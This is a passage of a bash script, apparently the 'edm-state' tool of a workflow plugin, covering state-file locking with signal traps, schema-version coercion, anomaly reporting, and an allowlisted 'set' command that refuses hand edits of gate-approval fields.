            _edm_reclaim_stale_lockdir "$lockdir" \
              "reclaimed stale state lock ${lockdir} (PID ${holder_pid} no longer running)"
            # Whether the mv above won or lost the race against another contender, fall through
            # to the shared retry accounting below instead of an unaccounted-for `continue`.
          fi
          _lock_retry_or_die "$lockdir" " (held by PID ${holder_pid})"
          continue
        fi
      fi
      _lock_retry_or_die "$lockdir" "${holder_pid:+ (held by PID ${holder_pid})}"
    done
    echo $$ > "$pidfile" 2>/dev/null || true

    # CA-159: never interpolate a path into a trap body string -- assign to a dedicated
    # variable first, then reference it INSIDE single quotes so it expands at signal time, not
    # at install time (an apostrophe in $lockdir, e.g. an "o'brien" directory, would otherwise
    # terminate the quoting early and corrupt the stored trap body into a syntax error at
    # signal time).
    _STATE_LOCKDIR="$lockdir"
    _save_traps
    # This trap layer owns exactly one resource -- the lockdir -- for the lifetime of this lock.
    # It does NOT need to know anything about write_atomic's own tmp file: write_atomic (called
    # from inside the "( "$@" )" subshell just below) installs its own full trap layer
    # unconditionally now and cleans up its own tmp file independently. A real signal delivered
    # to the process group reaches this (outer, PARENT) process directly too, so this trap fires
    # on its own copy of the signal regardless of whatever the subshell is doing to its own,
    # separate trap table (round-3 G2/CA-142 + G3/CA-143 re-fix -- see write_atomic's comment
    # above for the full analysis; the previous _EDM_CLEANUP_PATHS shared-list mechanism this
    # comment used to describe was dead code by construction and is deleted). INT/TERM/HUP
    # additionally exit with the conventional 128+signum code so a signal delivered inside the
    # critical section cannot release the lock and then resume the interrupted read-modify-write
    # -- the EXIT arm stays cleanup-only and must never call exit itself.
    trap 'rm -rf "$_STATE_LOCKDIR"' EXIT
    trap 'rm -rf "$_STATE_LOCKDIR"; exit 130' INT
    trap 'rm -rf "$_STATE_LOCKDIR"; exit 143' TERM
    trap 'rm -rf "$_STATE_LOCKDIR"; exit 129' HUP

    # G26: the reentrancy guard used to sit here, AFTER lock acquisition -- see the comment at
    # with_state_lock's top (above the `if command -v flock` branch) for why it moved ahead of
    # both branches' acquisition attempts entirely, and for exactly which nesting shape it
    # detects (same-lockbase self-nesting only).

    # CA-025: run the locked body in a subshell so this branch matches the flock branch's
    # existing subshell semantics -- previously the mkdir branch ran "$@" in the current shell
    # while the flock branch always subshelled it, an undocumented divergence (no live defect
    # today, since every locked body communicates by stdout/exit status only, but a footgun for
    # the next locked helper that doesn't). _EDM_TRAP_DEPTH is set to 1 before the fork purely so
    # a nested with_state_lock call (unsupported -- see the reentrancy guard at the top of this
    # function) is detected even from inside this subshell; it no longer has any bearing on
    # write_atomic's own trap installation (round-3 G2/CA-142 re-fix -- write_atomic always
    # installs its own layer now).
    #
    # G4 (round-3 CA-184 re-fix): guard the $? capture on the SAME statement as the subshell
    # call, not on the next line -- with_state_lock has ~30 bare callers (via rmw_state, called
    # with no `||` guard from most mutators), so a non-zero locked body in a non-tested position
    # under `set -e` would abort the whole process right here: `_EDM_TRAP_DEPTH` would never
    # reset to 0, the saved traps would never be restored, and `return $ec` would never run. See
    # write_atomic:~581's identical guard for the sibling class this round fixed there, CA-134.
    _EDM_TRAP_DEPTH=1
    local ec=0
    ( "$@" ) || ec=$?
    _EDM_TRAP_DEPTH=0
    rm -rf "$lockdir"
    _restore_traps
    return $ec
  fi
}

# ---- Type coercion helpers (T33) -------------------------------------------
# read_bool <json-string> <field> [<default>]
# Returns normalized bash boolean string "true" or "false" regardless of whether
# the field is stored as a JSON boolean or a JSON string.
read_bool() {
  local json="$1" field="$2" default="${3:-false}"
  echo "$json" | jq -r --arg f "$field" --arg d "$default" '
    (.[$f] // null) as $v |
    if $v == null then $d
    elif ($v | type) == "boolean" then (if $v then "true" else "false" end)
    elif ($v | type) == "string" then (if $v == "true" then "true" else "false" end)
    else $d
    end
  '
}

# ---- schema_version three-valued degradation (EDMV3-T09 contract, EDMV3-T14 wiring) --------
# WAVE_A_MERGE_DATE -- the calendar date wave A of the enforcement kernel (EDMV3-T09..T14, T17)
# merged. Grandfathering is bounded, not open-ended (EDMV3-T14 description): every initiative
# that predates this date was created before schema_version existed at all, so absent
# schema_version on such a file is expected, not a defect. Recorded as a real constant (not a
# placeholder) so a reader of the grandfathering rule sees an actual boundary; it does not gate
# any runtime check itself -- SCHEMA_VERSION_MISSING (EDMV3-T10 AC6) fires for every
# non-archived initiative missing schema_version regardless of age (EDMV3-T14 AC10), so the
# exemption never becomes permanent just because an initiative is old.
WAVE_A_MERGE_DATE="2026-07-27"

# schema_at_least <schema-version-or-empty> <required-min>
# The three-valued degradation model every schema_version-consulting check uses, so each check
# consults one shared helper rather than re-deriving the comparison (EDMV3-T14 Technical Notes):
#   0 = absent      -- legacy signal (C-4); the caller warn-and-proceeds with no enforcement
#   1 = below <min>  -- present but this check's minimum is not met; warn-and-proceed for THIS
#                       check only (other checks at or below the recorded version still apply
#                       normally -- this is the middle class EDMV3-T09 defines and EDMV3-T14
#                       wires end-to-end)
#   2 = at-or-above -- full enforcement, no warning
schema_at_least() {
  local sv="$1" min="$2"
  # Coerce before the arithmetic comparison below. `[[ x -ge y ]]` arithmetic-evaluates its
  # operands and command-substitutes any array subscript inside them, so an uncoerced
  # `.schema_version` read straight out of a committed state file is a command-injection sink --
  # the same one `to_int`'s comment documents for `.current_phase`. Ten call sites read this field
  # with a bare `jq -r '.schema_version // empty'`, so guarding here covers all of them at once
  # rather than relying on each caller to remember.
  #
  # A present-but-non-integer value is treated as legacy/absent (0), not as a version: an
  # unparseable value tells us nothing about the shape on disk, so the safe reading is "no
  # enforcement claim", which is exactly what an absent field means.
  sv="$(to_int "$sv" 0)"
  # CA-140: `-z` was dead -- to_int with a default never returns empty, so the only condition
  # that can ever be true after coercion is "coerced to 0" (absent or non-integer input, both of
  # which to_int normalizes to the default).
  if [[ "$sv" -eq 0 ]]; then
    echo 0
  elif [[ "$sv" -ge "$min" ]]; then
    echo 2
  else
    echo 1
  fi
}

# ---- Audit round shared definitions (EDMV3-T27) -----------------------------
# ALL_LENS_IDS -- the eleven canonical code-audit lens IDs, single source (EDMV3-T27 Technical
# Notes: "Hardcode the list once next to the derivation and assert its length is 11"). bash 3.2
# has no portable array-as-constant idiom usable across functions, so this follows the identical
# space-separated-string + word-membership pattern MODE_ENUM_LIST/LIFECYCLE_MODE_ENUM_LIST use
# above, for the same reason.
ALL_LENS_IDS="L1 L2 L3 L4 L5 L6 L7 L8 L9 L10 L11"
# shellcheck disable=SC2086 -- deliberate word-splitting; bash 3.2 has no arrays-as-constants
[[ "$(echo $ALL_LENS_IDS | wc -w | tr -d ' ')" -eq 11 ]] || die "internal: ALL_LENS_IDS must enumerate exactly 11 lenses"

# AUDIT_ROUND_COERCE_JQ_DEF -- the single C-4 coercion for audit_rounds.<type> (EDMV3-T27 AC1a).
# Every state file written before this ticket (and the archived EDMV2 fixture literally) stores
# audit_rounds.<type> as a bare integer round COUNT. This ticket widens the shape to
# {count, rounds: [...]} so a round can carry its lens set and round_type -- but no legacy file
# is rewritten (AC1a), so every reader of audit_rounds.<type> pipes the raw value through this
# one jq `def` first: a bare number N reads as {count: N, rounds: []} (no per-round detail
# available, which is exactly the "unknown round type" case AC6 handles); a value already in the
# new shape passes through with `rounds` defaulted to `[]` so a partially-written object never
# crashes a `.rounds[-1]` lookup downstream. Embedded as source text into each jq program that
# needs it (bash has no way to pass a jq function value directly).
AUDIT_ROUND_COERCE_JQ_DEF='def coerce_round_entry: if type == "number" then {count: ., rounds: []} elif type == "object" then (. + {rounds: (.rounds // [])}) else {count: 0, rounds: []} end;'

# ---- Convergence blocking-set shared definition (EDMV3-T28) -----------------
# The single jq boolean predicate for "this finding blocks convergence" (EDMV3-T28 AC9): an
# open finding -- or a legacy `deferred` line, coerced to open per EDMV3-T25 AC4 / EDMV3-T28 AC5
# (deferred does not exist as a status going forward, but a line already on disk in that shape
# is re-opened rather than silently dropped) -- whose severity is P0, P1 or P2. `NOTED` is
# excluded: it is non-actionable via the False Alarm Filter, not a deferred finding (CLAUDE.md
# Sec."Severity vocabulary"). Every consumer -- cmd_audit_converged, cmd_approve_gate's
# code-audit branch, cmd_archive's convergence check, and write_handoff_internal's Phase-6
# next_action rendering -- references this one definition by name rather than restating the
# P0/P1/P2 membership test a second time.
BLOCKING_FILTER='(.status == "open" or .status == "deferred") and (.sev == "P0" or .sev == "P1" or .sev == "P2")'

# ---- State anomaly detection (T29, class split EDMV3-T05 / EDMV3-118) ------
# state_anomalies <PREFIX>
# Reads state and emits zero or more anomaly lines. Each line has the canonical
# four-field form (EDMV3-T05 AC2 -- canonical for the whole initiative; every
# anomaly added by a later ticket restates these same four fields):
#   <class>  <CODE>  <affected-field>  <description>
# <class> is "info" or "blocking", declared at the point each line is emitted (not
# inferred by the consumer). Only a "blocking" line flips cmd_validate's exit code
# (EDMV3-T05 AC3/AC4) -- "info" lines are always printed, never silenced.
# Exits 0 and emits nothing when no anomalies found. Never mutates state.
#
# Reclassification record (EDMV3-T05 AC5): SIZE_UNKNOWN is reclassified here from
# "any anomaly blocks validate" to "info" -- it flags missing cost-tracking
# metadata (an unset estimated_size), not corrupted data, and no caller anywhere
# in plugins/edm/ inspects validate's exit code for it (verified by grep at
# reclassification time, 2026-07-26). TIME_ORDER and ZERO_TOKENS remain
# "blocking": both indicate corrupted timestamp/cost data, not missing metadata.
state_anomalies() {
  local prefix="$1"
  require_jq
  local state
  state="$(read_state "$prefix")"
  # TIME_ORDER (blocking): completed_at earlier than started_at within any phase entry
  while IFS= read -r line; do
    [[ -n "$line" ]] || continue
    echo "blocking  $line"
  done < <(echo "$state" | jq -r '
    .phase_durations // {} | to_entries[] |
    .key as $k | .value as $v |
    if ($v.started_at != null and $v.started_at != "" and
        $v.completed_at != null and $v.completed_at != "") then
      (($v.completed_at | fromdateiso8601?) // 0) as $c |
      (($v.started_at | fromdateiso8601?) // 0) as $s |
      if $c > 0 and $s > 0 and $c < $s then
        "TIME_ORDER  phase_durations.\($k)  completed_at (\($v.completed_at)) is earlier than started_at (\($v.started_at))"
      else empty end
    else empty end
  ' 2>/dev/null)
  # SIZE_UNKNOWN (info -- reclassified EDMV3-T05, see comment above): estimated_size
  # is "Unknown" and current_phase >= 2. Suppressed for fast-track/fix-pack lifecycle
  # modes where size estimation is N/A.
  local phase size lifecycle_mode_anom
  phase="$(echo "$state" | jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end')"
  size="$(echo "$state" | jq -r '.estimated_size // "Unknown"')"
  lifecycle_mode_anom="$(echo "$state" | jq -r '.lifecycle_mode // "standard"')"
  if [[ "$size" == "Unknown" && "$phase" -ge 2 \
        && "$lifecycle_mode_anom" != "fast-track" && "$lifecycle_mode_anom" != "fix-pack" ]]; then
    echo "info  SIZE_UNKNOWN  estimated_size  size is still Unknown at phase ${phase} (set via edm-state set ${prefix} estimated_size Small|Medium|Large)"
  fi
  # ZERO_TOKENS (blocking): model_used is set but input+output tokens are both 0
  while IFS= read -r line; do
    [[ -n "$line" ]] || continue
    echo "blocking  $line"
  done < <(echo "$state" | jq -r '
    .phase_durations // {} | to_entries[] |
    .key as $k | .value as $v |
    if ($v.model_used != null and $v.model_used != "" and $v.model_used != "unknown" and
        ($v.tokens.input // 0) == 0 and ($v.tokens.output // 0) == 0) then
      "ZERO_TOKENS  phase_durations.\($k).tokens  model_used is \($v.model_used) but both input and output tokens are 0"
    else empty end
  ' 2>/dev/null)
  # TORN_TOKEN_LINES (info -- G10 remediation, round-3 Wave 7c): unparseable_lines is a non-zero
  # count of session-JSONL lines that get_session_tokens_since could not parse as JSON while
  # summing tokens for a phase or audit round -- a routine race against Claude Code still
  # appending to its own driving session file, not corrupted state. Informational only: it never
  # flips cmd_validate's exit code, and attribution_mode stays a strict scoped|whole-directory
  # enum regardless (a parse failure no longer overloads that field with a third value). Surfaced
  # here so a reviewer can distinguish a low/zero token figure caused by skipped lines from one
  # that is a genuine anomaly.
  while IFS= read -r line; do
    [[ -n "$line" ]] || continue
    echo "info  $line"
  done < <(echo "$state" | jq -r '
    .phase_durations // {} | to_entries[] |
    .key as $k | .value as $v |
    if ((($v.unparseable_lines // 0) | tonumber) > 0) then
      "TORN_TOKEN_LINES  phase_durations.\($k).unparseable_lines  \($v.unparseable_lines) session-JSONL line(s) failed to parse while computing tokens for phase \($k)"
    else empty end
  ' 2>/dev/null)
  local ttl_type ttl_rounds_json
  for ttl_type in code srd tickets; do
    ttl_rounds_json="$(echo "$state" | jq -c --arg t "$ttl_type" "${AUDIT_ROUND_COERCE_JQ_DEF} (.audit_rounds[\$t] // 0 | coerce_round_entry).rounds" 2>/dev/null || echo '[]')"
    while IFS= read -r line; do
      [[ -n "$line" ]] || continue
      echo "info  $line"
    done < <(echo "$ttl_rounds_json" | jq -r --arg t "$ttl_type" '
      .[] |
      if ((.unparseable_lines // 0) | tonumber) > 0 then
        "TORN_TOKEN_LINES  audit_rounds.\($t).rounds[\(.round)].unparseable_lines  \(.unparseable_lines) session-JSONL line(s) failed to parse while computing tokens for \($t) audit round \(.round)"
      else empty end
    ' 2>/dev/null)
  done
  # OPEN_AUDIT_ROUND (info -- EDMV3-T51 AC4/AC5): an audit round was started
  # (audit-round-start) but never completed (audit-round-complete) -- the EDMV2 Phase-6
  # failure mode (phase-start fired, phase-complete never did) applied to a single audit
  # round instead of a whole phase. Informational only: a round in progress mid-audit is
  # normal, not corrupted data, so this never flips cmd_validate's exit code (mirrors
  # SIZE_UNKNOWN's reclassification rationale above). Uses the same coerce_round_entry
  # widening every audit_rounds reader uses, so a legacy bare-integer shape reads cleanly.
  local oar_type oar_rounds_json oar_last oar_round_num oar_completed
  for oar_type in code srd tickets; do
    oar_rounds_json="$(echo "$state" | jq -c --arg t "$oar_type" "${AUDIT_ROUND_COERCE_JQ_DEF} (.audit_rounds[\$t] // 0 | coerce_round_entry).rounds" 2>/dev/null || echo '[]')"
    oar_last="$(echo "$oar_rounds_json" | jq -c 'if length > 0 then .[-1] else null end' 2>/dev/null || echo null)"
    [[ "$oar_last" == "null" ]] && continue
    oar_round_num="$(echo "$oar_last" | jq -r '.round // "?"')"
    oar_completed="$(echo "$oar_last" | jq -r '.completed_at // empty')"
    if [[ -z "$oar_completed" ]]; then
      echo "info  OPEN_AUDIT_ROUND  audit_rounds  ${oar_type} audit round ${oar_round_num} for ${prefix} was started but never completed -- run edm-state audit-round-complete ${prefix} ${oar_type}"
    fi
  done
  # PERM_RULES_MISSING (info -- EDMV3-T06 AC5): the two "ask" rules that gate
  # `edm-state approve-gate` and `edm-state archive` are absent from every settings file
  # check_permission_rules() scans. Informational only (AC7): the plugin cannot ship these
  # settings itself (README.md documents the required block), so their absence is a
  # warning, never a validate-failing condition -- it never flips cmd_validate's exit code.
  if [[ "$(check_permission_rules)" != "permission-ask" ]]; then
    echo "info  PERM_RULES_MISSING  permissions.ask  required ask rules Bash(edm-state approve-gate*) and Bash(edm-state archive*) not found in .claude/settings.local.json, .claude/settings.json, or ~/.claude/settings.json -- add {\"permissions\": {\"ask\": [\"Bash(edm-state approve-gate*)\", \"Bash(edm-state archive*)\"]}} to enforce human review at gate-approval and archive time"
  fi
  # CONVERGED_NO_APPROVAL (blocking -- EDMV3-T17 AC3): code_audit_converged is true but no
  # code_audit_gate_approved_at record exists -- e.g. a hand-edited state file, not one
  # produced by `edm-state approve-gate ... code-audit`. Only fires when schema_version is
  # present, so a legacy pre-EDMV3 file (which never had a schema_version field and predates
  # this expectation entirely) is never flagged (C-4).
  local cac_val cac_schema_version cac_approved_at
  cac_val="$(read_bool "$state" "code_audit_converged" "false")"
  cac_schema_version="$(echo "$state" | jq -r '.schema_version // empty')"
  cac_approved_at="$(echo "$state" | jq -r '.code_audit_gate_approved_at // empty')"
  if [[ "$cac_val" == "true" && -n "$cac_schema_version" && -z "$cac_approved_at" ]]; then
    echo "blocking  CONVERGED_NO_APPROVAL  code_audit_converged  code_audit_converged is true for ${prefix} but no code_audit_gate_approved_at record exists -- run edm-state approve-gate ${prefix} code-audit, or investigate a hand-edited state file"
  fi
  # OPEN_PARTIALS (blocking -- EDMV3-T18 AC7): a partial_verdict_map entry is either still
  # open (never closed, the original `verdict == "PARTIAL"` shape from T67) or closed FAIL
  # (a failed runtime verification, which must be remediated -- there is no third closure
  # verdict). Surfaced here so `edm-state validate` reports it independently of archive's own
  # refusal, in the canonical four-field format (EDMV3-T05 AC2). Not schema-gated: the
  # underlying partial_verdict_map has existed since before schema_version was introduced
  # (T67), so an "open PARTIAL" is real regardless of this initiative's schema_version.
  local open_partials_anom_lines open_partials_anom_entry open_partials_anom=""
  open_partials_anom_lines="$(echo "$state" | jq -r '
    (.partial_verdict_map // {}) | to_entries[] |
    if (.value.verdict == "PARTIAL") then "\(.key) (open)"
    elif (.value.closing_verdict == "FAIL") then "\(.key) (FAIL-closed)"
    else empty end
  ' 2>/dev/null || true)"
  if [[ -n "$open_partials_anom_lines" ]]; then
    while IFS= read -r open_partials_anom_entry; do
      [[ -n "$open_partials_anom_entry" ]] || continue
      open_partials_anom="${open_partials_anom}${open_partials_anom:+, }${open_partials_anom_entry}"
    done <<< "$open_partials_anom_lines"
    echo "blocking  OPEN_PARTIALS  partial_verdict_map  unclosed or FAIL-closed PARTIAL verdict(s) for ${prefix}: ${open_partials_anom}; run /edm:verify-runtime ${prefix} to close each before archiving"
  fi
  # LEGACY_LIFECYCLE_MODE (info -- EDMV3-T59 / D12): `partial` was removed from the settable
  # lifecycle_mode enum (a legal value with no sub-flow anywhere). A file written before the
  # removal still reads -- terminal_phase_for_mode treats it as `standard`, its only ever
  # behaviour -- but the operator is told, so the stale value can be corrected deliberately
  # rather than discovered later. Informational: reading a legacy file is not a defect.
  local legacy_lifecycle_anom
  legacy_lifecycle_anom="$(echo "$state" | jq -r '.lifecycle_mode // empty')"
  if [[ "$legacy_lifecycle_anom" == "partial" ]]; then
    echo "info  LEGACY_LIFECYCLE_MODE  lifecycle_mode  ${prefix} carries the removed lifecycle_mode 'partial' (read as 'standard'); run edm-state set-mode ${prefix} lifecycle_mode standard to clear it"
  fi
  # SCHEMA_VERSION_MISSING (info -- EDMV3-T10 AC6): schema_version is absent for this
  # (necessarily non-archived -- state_anomalies is only ever reached via a resolvable,
  # non-archived path) initiative. Informational only: absence is the legacy signal every
  # wave-A check degrades against (C-4), so it never flips cmd_validate's exit code -- it is
  # a prompt to backfill, not a defect. Also fires when schema_version was removed by hand
  # from a previously-migrated state file (EDMV3-T10 AC7), since this check only looks at
  # the field's current presence, not history.
  local schema_version_anom
  schema_version_anom="$(echo "$state" | jq -r '.schema_version // empty')"
  if [[ -z "$schema_version_anom" ]]; then
    echo "info  SCHEMA_VERSION_MISSING  schema_version  no schema_version recorded for ${prefix} -- run edm-state migrate-schema ${prefix} to backfill enforcement-kernel compatibility"
  fi
  # EMPTY_SKIP_RATIONALE / ACTIVE_EXEMPTION on skipped_phases (info -- EDMV3-T62 AC3/AC7): every
  # exemption D13(c) leaves in place (skip-phase, legacy degradation) must leave an audit trail
  # (EDMV3-94). cmd_skip_phase refuses a NEW empty rationale (AC2), but a pre-existing entry
  # written before this ticket -- or a hand-edited one -- is read without error (C-4) and
  # surfaced here rather than silently accepted or crashing on. A non-empty rationale is instead
  # a sanctioned, active exemption and gets its own ACTIVE_EXEMPTION line so a reviewer can see
  # every invariant that was not enforced without a healthy initiative exiting non-zero.
  local skip_lines skip_phase skip_rationale
  skip_lines="$(echo "$state" | jq -r '(.skipped_phases // [])[] | "\(.phase)\t\(.rationale // "")"' 2>/dev/null || true)"
  if [[ -n "$skip_lines" ]]; then
    while IFS=$'\t' read -r skip_phase skip_rationale; do
      [[ -n "$skip_phase" ]] || continue
      if [[ -z "$skip_rationale" ]]; then
        echo "info  EMPTY_SKIP_RATIONALE  skipped_phases  phase ${skip_phase} of ${prefix} has an empty rationale -- a pre-existing entry, not migrated by this check (C-4); hand-edit the state file to backfill one if the reason is known"
      else
        echo "info  ACTIVE_EXEMPTION  skipped_phases  phase ${skip_phase} of ${prefix} is intentionally skipped: ${skip_rationale}"
      fi
    done <<< "$skip_lines"
  fi
  # ACTIVE_EXEMPTION on archive_exemptions (info -- EDMV3-T62 AC7): a lifecycle/mode that waived
  # the code-audit convergence check (cmd_archive's CONVERGENCE_NOT_REQUIRED path) recorded the
  # exemption in state; surface it here too so it is visible from `validate`, not only from
  # HANDOFF.md's gate row.
  local archive_exemption
  while IFS= read -r archive_exemption; do
    [[ -n "$archive_exemption" ]] || continue
    echo "info  ACTIVE_EXEMPTION  archive_exemptions  ${archive_exemption} recorded for ${prefix} (lifecycle/mode waives the code-audit convergence check)"
  done < <(echo "$state" | jq -r '(.archive_exemptions // [])[]' 2>/dev/null || true)
  # ACTIVE_EXEMPTION on degraded_checks (info -- EDMV3-T62 AC5/AC7): a legacy warn-and-proceed
  # skip (recorded by record_degraded_check() below) is the other half of "the only ways a check
  # does not apply" (EDMV3-94's Description). Surfaced here so it is recoverable from `validate`,
  # not only from the transient console warning that originally reported it.
  local degraded_check degraded_reason
  while IFS=$'\t' read -r degraded_check degraded_reason; do
    [[ -n "$degraded_check" ]] || continue
    echo "info  ACTIVE_EXEMPTION  degraded_checks  ${degraded_check} skipped for ${prefix}: ${degraded_reason}"
  done < <(echo "$state" | jq -r '(.degraded_checks // [])[] | "\(.check)\t\(.reason)"' 2>/dev/null || true)
  return 0
}

# record_degraded_check <PREFIX> <check-name> <reason>
# Persists a legacy warn-and-proceed skip into .degraded_checks (additive, `// []` idiom so a
# legacy read never produces a null -- EDMV3-107) so the fact that a check was skipped is
# recoverable from the state file, not only from the transient "[warn] legacy initiative" console
# line that also reports it at the call site (EDMV3-T62 AC5). Uses rmw_state like every other
# state mutation (EDMV3-92) -- this is its own lock acquisition, separate from whatever mutation
# the calling command performs next, since not every call site (cmd_archive's legacy branches)
# has an unconditional trailing rmw_state call to fold this into.
#
# CA-061: short-circuits before taking the write lock when the (check, reason) pair is already
# recorded. cmd_gate_check calls this on EVERY invocation for a legacy initiative -- each of the
# five UserPromptExpansion hooks that reach it was unconditionally taking the write lock, writing
# a .bak backup, and mv-ing back a byte-identical file (the idempotence lived inside the jq
# filter below, not in front of it). On a read-only checkout the cp -p backup step inside
# _rmw_state_body aborts under set -e, silently breaking a mode gate-check's own --help text
# documents as "(read-only)". The pre-check is best-effort and read-only: any read/parse failure
# falls through to the normal locked path below rather than risking an incorrect skip, and a
# benign TOCTOU race against a concurrent recorder just means the locked jq filter's own
# idempotence handles it exactly as it always has.
#
# G22: a SECOND, separate pre-check -- writability, not idempotence -- covers the case the
# idempotence check above does not: the FIRST invocation for a legacy initiative, where the
# (check, reason) pair is genuinely new. On a read-only checkout that first call would otherwise
# fall through to rmw_state, which needs to create the lockdir alongside the state file; that now
# fails fast with a real "Permission denied" (the with_state_lock G22 fix above) instead of the
# old misleading 50-try lock-timeout, but a real error is still not what a documented "(read-only)"
# subcommand like gate-check should surface for something as inconsequential as a degraded-check
# breadcrumb. So: warn-and-skip here instead, preserving the read-only contract end to end. Best
# effort like the idempotence check above -- if the directory can't even be determined, fall
# through to rmw_state rather than risk silently skipping a check that would have succeeded.
record_degraded_check() {
  local prefix="$1" check="$2" reason="$3"
  local already
  already="$(read_state "$prefix" 2>/dev/null | jq -r --arg c "$check" --arg r "$reason" '
    ((.degraded_checks // []) | any(.check == $c and .reason == $r)) // false
  ' 2>/dev/null || echo false)"
  [[ "$already" == "true" ]] && return 0
  local _f _dir
  _f="$(state_file_for "$prefix" 2>/dev/null || true)"
  if [[ -n "$_f" ]]; then
    _dir="$(dirname "$_f")"
    if [[ -d "$_dir" && ! -w "$_dir" ]]; then
      echo "edm-state: [warn] cannot record degraded check '${check}' for ${prefix} -- state directory ${_dir} is not writable; skipping (gate-check remains read-only)" >&2
      return 0
    fi
  fi
  rmw_state "$prefix" '
    (.degraded_checks // []) as $existing
    | if any($existing[]?; .check == $c and .reason == $r) then .
      else .degraded_checks = ($existing + [{check: $c, reason: $r, recorded_at: $ts}])
      | .last_updated = $ts
      end
  ' --arg c "$check" --arg r "$reason" --arg ts "$(now_utc)"
}

# format_anomaly_line <four-field-anomaly-line>
# Renders one canonical anomaly line (EDMV3-T05 AC2 format) with a class-specific,
# visually distinct marker. Shared by cmd_session_start so its rendering can never
# diverge from the raw four-field format cmd_validate prints (EDMV3-T05 AC6).
format_anomaly_line() {
  local line="$1" class rest
  class="${line%% *}"
  rest="${line#"$class"}"
  rest="${rest#"  "}"
  if [[ "$class" == "blocking" ]]; then
    printf '  [BLOCKING] %s\n' "$rest"
  else
    printf '  [info] %s\n' "$rest"
  fi
}

cmd_get() {
  [[ $# -eq 1 ]] || die "usage: edm-state get <PREFIX>"
  read_state "$1"
}

# ---- cmd_set contract (EDMV3-T09) -------------------------------------------
# SETTABLE_KEYS -- the single-source enumeration of every key `cmd_set` will write,
# consumed by BOTH the allowlist check and the unknown-key error message below
# (EDMV3-13 AC5/AC9) so the two can never drift apart. bash 3.2 has no associative
# arrays, so this is a space-separated string constant tested with the word-membership
# idiom `case " $SETTABLE_KEYS " in *" $key "*)` (mirrors MODE_ENUM_LIST above).
# Boolean-typed: compliance_enabled. Numeric-typed: current_phase, qc_shard_threshold.
# Every other entry is a generic (string) key. The enumeration covers every key any
# live skill/agent/hook/bin call site currently sets (EDMV3-15's caller-contract test,
# bin/tests/wave7-smoke.sh, greps for drift in either direction).
# `estimated_size`'s producer is `skills/plan/SKILL.md`'s HITL Gate 1 step (added
# round-3 Wave 7e -- previously had no producer, only bin/edm-state's own SIZE_UNKNOWN
# anomaly message reading it). `last_decision`'s one real producer is `skills/srd/SKILL.md`
# (not `skills/orchestrator/SKILL.md`, a prior misattribution corrected here). product_name
# (cmd_set smoke coverage), test_layer_skipped (skills/implement/SKILL.md),
# jira_synced_at/jira_project_key (skills/push-jira/SKILL.md), coverage_by_epic/
# test_frameworks_detected (agents/edm-test-coverage-auditor.md, agents/edm-test-planner.md).
# `last_cmd` (CA-246, round 5 G11): had zero producers anywhere in skills/agents/hooks for
# three consecutive rounds -- only bin/tests/*.sh fixtures ever wrote it, and both consumers
# (session-start, HANDOFF.md) were permanently suppressed dead code as a result. Deleted
# entirely rather than kept settable "for a future producer": documenting an unproduced field
# a third round is not a resolution state in this methodology (CLAUDE.md Sec."Severity vocabulary").
SETTABLE_KEYS="compliance_enabled current_phase qc_shard_threshold last_decision estimated_size product_name test_layer_skipped jira_synced_at jira_project_key coverage_by_epic test_frameworks_detected"

# GATE_BEARING_KEYS -- the single token list of gate-bearing fields (EDMV3-14): every
# field named here refuses `set` unconditionally, regardless of the value supplied,
# rather than falling through to the generic branch (which would write the *string*
# "true"/"false" where a boolean belongs -- read_bool tolerates that shape, so the
# corruption would go unnoticed until the gate it guards silently opened). A fourth
# such field added later inherits this behaviour by adding one token here and one arm
# to the shared refusal branch in cmd_set below -- not a second mechanism.
GATE_BEARING_KEYS="code_audit_converged compliance_gate_approved gates_approved"

cmd_set() {
  [[ $# -eq 3 ]] || die "usage: edm-state set <PREFIX> <key> <value>"
  require_jq
  local prefix="$1" key="$2" value="$3"

  # Shared gate-bearing refusal branch (EDMV3-14): runs before any other check, and
  # before any mutation, so all three fields in GATE_BEARING_KEYS behave identically
  # for every supplied value (true, false, or garbage). Each refusal names the
  # specific `approve-gate` invocation that is the legitimate path.
  case " $GATE_BEARING_KEYS " in
    *" $key "*)
      case "$key" in
        code_audit_converged)
          die "set: '$key' is refused -- run 'edm-state approve-gate <PREFIX> code-audit' instead" ;;
        compliance_gate_approved)
          die "set: '$key' is refused -- run 'edm-state approve-gate <PREFIX> 3.5' instead" ;;
        gates_approved)
          die "set: '$key' is refused -- run 'edm-state approve-gate <PREFIX> <gate-num>' instead" ;;
      esac
      ;;
  esac

  # schema_version (EDMV3-13 AC9): a single-writer field, refused here rather than
  # added to SETTABLE_KEYS. Making it cmd_set-settable would reopen exactly the
  # hand-flip path the allowlist exists to close. `edm-state migrate-schema` is the
  # only writer.
  if [[ "$key" == "schema_version" ]]; then
    die "set: 'schema_version' is refused -- single-writer field, run 'edm-state migrate-schema <PREFIX>' instead"
  fi

  # Allowlist (EDMV3-13): an unknown key is refused before any mutation, naming the
  # full sorted list of legal keys so the caller can self-correct.
  case " $SETTABLE_KEYS " in
    *" $key "*) ;;
    *)
      # shellcheck disable=SC2086 -- deliberate word-splitting; bash 3.2 has no arrays-as-constants
      die "set: unknown key '$key'. Valid keys: $(printf '%s\n' $SETTABLE_KEYS | sort | tr '\n' ' ' | sed 's/ *$//')"
      ;;
  esac

  case "$key" in
    compliance_enabled)
      [[ "$value" == "true" || "$value" == "false" ]] \
        || die "set: field '$key' requires a boolean value (true|false); got: $value"
      rmw_state "$prefix" '.[$k] = ($v == "true") | .last_updated = $t' \
        --arg v "$value" --arg k "$key" --arg t "$(now_utc)"
      ;;
    current_phase|qc_shard_threshold)
      [[ "$value" =~ ^-?[0-9]+(\.[0-9]+)?$ ]] \
        || die "set: field '$key' requires a numeric value; got: $value"
      rmw_state "$prefix" '.[$k] = ($v|tonumber) | .last_updated = $t' \
        --arg v "$value" --arg k "$key" --arg t "$(now_utc)"
      ;;
    *)
      rmw_state "$prefix" '.[$k] = $v | .last_updated = $t' \
        --arg k "$key" --arg v "$value" --arg t "$(now_utc)"
      ;;
  esac
}

_cmd_init_render() {
  local prefix="$1" branch="$2" product="$3" description="$4" mode="$5" impl_mode="$6" compliance="$7" seeded_skipped="$8"
  jq -n --arg p "$prefix" --arg t "$(now_utc)" --arg b "$branch" \
        --arg prod "$product" --arg desc "$description" \
        --arg mode "$mode" --arg impl "$impl_mode" --argjson ce "$compliance" \
        --argjson skipped "$seeded_skipped" '{
    prefix: $p,
    schema_version: 1,
    current_phase: 0,
    gates_approved: [],
    artifacts: {},
    artifact_hashes: {},
